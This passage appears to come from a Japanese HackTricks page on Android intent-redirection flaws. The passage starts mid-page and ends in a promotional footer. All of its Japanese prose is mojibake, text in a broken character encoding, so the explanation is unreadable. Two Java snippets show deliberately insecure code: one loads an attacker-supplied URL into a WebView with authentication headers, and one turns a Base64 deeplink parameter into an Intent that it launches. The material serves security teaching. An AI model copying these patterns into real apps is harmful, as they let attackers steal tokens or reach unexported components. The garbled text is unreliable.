webView.loadUrl(getIntent().getData().getQueryParameter("url"), getAuthHeaders());
```
ã—ãŸãŒã£ã¦ã€ã‚¢ã‚¯ãƒ†ã‚£ãƒ“ãƒ†ã‚£ãŒã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆã•ã‚Œã‚‹å‰ã«ã€ãã‚ŒãŒèµ·å‹•ã•ã‚Œã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã“ã¨ã‚’ãŠå‹§ã‚ã—ã¾ã™ã€‚

## ã‚¤ãƒ³ãƒ†ãƒ³ãƒˆã‚’ä¸å®‰å…¨ã«ä½œæˆã™ã‚‹ä»–ã®æ–¹æ³•

ä¸€éƒ¨ã®ã‚¢ãƒ—ãƒªé–‹ç™ºè€…ã¯ã€**ç‹¬è‡ªã®ã‚¤ãƒ³ãƒ†ãƒ³ãƒˆãƒ‘ãƒ¼ã‚µãƒ¼**ã‚’å®Ÿè£…ã—ã¦ã„ã¾ã™ï¼ˆã—ã°ã—ã°**ãƒ‡ã‚£ãƒ¼ãƒ—ãƒªãƒ³ã‚¯**ã‚„ãƒ—ãƒƒã‚·ãƒ¥ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’å‡¦ç†ã™ã‚‹ãŸã‚ã«ï¼‰ã€ä¾‹ãˆã°**JSON**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã€æ–‡å­—åˆ—ã€ã¾ãŸã¯ãƒã‚¤ãƒˆé…åˆ—ã‚’ä½¿ç”¨ã—ã¦ãŠã‚Šã€ã“ã‚Œã‚‰ã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã¨ç•°ãªã‚‰ãªã„ã‹ã€ã¾ãŸã¯éå¸¸ã«å±é™ºã‚’ä¼´ã„ã¾ã™ã€‚ãªãœãªã‚‰ã€**`Serializable`**ã‚„`Parcelable`ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’æ‹¡å¼µã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã€ä¸å®‰å…¨ãªãƒ•ãƒ©ã‚°ã‚’è¨­å®šã™ã‚‹ã“ã¨ã‚‚è¨±å¯ã•ã‚Œã¦ã„ã‚‹ã‹ã‚‰ã§ã™ã€‚ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç ”ç©¶è€…ã¯ã€ãƒã‚¤ãƒˆé…åˆ—ã‚’`Parcel`ã«ã‚­ãƒ£ã‚¹ãƒˆã—ã€ãã“ã‹ã‚‰ã‚¤ãƒ³ãƒ†ãƒ³ãƒˆã‚’èª­ã¿å–ã‚‹ãªã©ã€ã‚ˆã‚Šã‚¨ã‚­ã‚¾ãƒãƒƒã‚¯ãªã‚¤ãƒ³ãƒ†ãƒ³ãƒˆä½œæˆã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«é­é‡ã™ã‚‹ã“ã¨ã‚‚ã‚ã‚Šã¾ã™ã€‚
```java
Uri deeplinkUri = getIntent().getData();
if(deeplinkUri.toString().startsWith("deeplink://handle/")) {
byte[] handle = Base64.decode(deeplinkUri.getQueryParameter("param"), 0);
Parcel parcel = Parcel.obtain();
parcel.unmarshall(handle, 0, handle.length);
startActivity((Intent) parcel.readParcelable(getClassLoader()));
}
```
# è„†å¼±æ€§ã‚¢ãƒ—ãƒª

{% embed url="https://github.com/oversecured/ovaa" %}


<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ã‚’ãƒã‚§ãƒƒã‚¯ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã€ã¾ãŸã¯**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks) ãŠã‚ˆã³ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’**å…±æœ‰ã™ã‚‹**ã€‚

</details>
